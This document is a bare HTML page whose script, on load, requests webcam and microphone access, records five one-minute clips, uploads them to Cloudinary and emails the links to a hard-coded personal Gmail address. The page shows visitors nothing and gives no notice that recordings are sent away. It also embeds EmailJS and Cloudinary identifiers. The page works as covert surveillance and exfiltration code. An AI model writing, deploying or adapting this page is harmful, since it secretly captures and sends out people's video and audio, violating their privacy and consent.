<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>H1 Video Recorder Loop</title>
</head>
<body>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("ACOn6PC1Zb70JrmxT"); // Your EmailJS Public Key

    const serviceID = "service_khmk344";  // Your EmailJS Service ID
    const templateID = "template_oyrsayr"; // Your EmailJS Template ID
    const cloudName = "dymxlqxxx";  // Your Cloudinary Cloud Name
    const uploadPreset = "unsigned_video_uploads"; // Your unsigned Cloudinary upload preset

    const totalVideos = 5;
    let currentCount = 0;

    async function uploadToCloudinary(blob) {
      const formData = new FormData();
      formData.append('file', blob);
      formData.append('upload_preset', uploadPreset);

      const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) throw new Error('Cloudinary upload failed');
      const data = await response.json();
      return data.secure_url; // The URL of the uploaded video
    }

    async function sendEmail(videoUrl) {
      return emailjs.send(serviceID, templateID, {
        to_email: "julianlee252@gmail.com",
        message: `Hereâ€™s your 1-minute video recording. Watch it here: ${videoUrl}`
      });
    }

    async function recordAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const recorder = new MediaRecorder(stream);
        let chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);

        return new Promise((resolve, reject) => {
          recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            chunks = []; // reset chunks

            try {
              const videoUrl = await uploadToCloudinary(blob);
              await sendEmail(videoUrl);
              resolve();
            } catch (err) {
              reject(err);
            } finally {
              stream.getTracks().forEach(track => track.stop());
            }
          };

          recorder.start();
          setTimeout(() => recorder.stop(), 60000); // 1 minute
        });

      } catch (err) {
        throw new Error('Permission denied or error: ' + err.message);
      }
    }

    async function startLoop() {
      while (currentCount < totalVideos) {
        try {
          await recordAndSend();
          currentCount++;
          console.log(`Video ${currentCount} sent.`);
        } catch (error) {
          console.error('Error during recording/sending:', error);
          break; // stop if error occurs
        }
      }
      console.log('All videos processed or stopped early.');
    }

    window.onload = startLoop;
  </script>
</body>
</html>
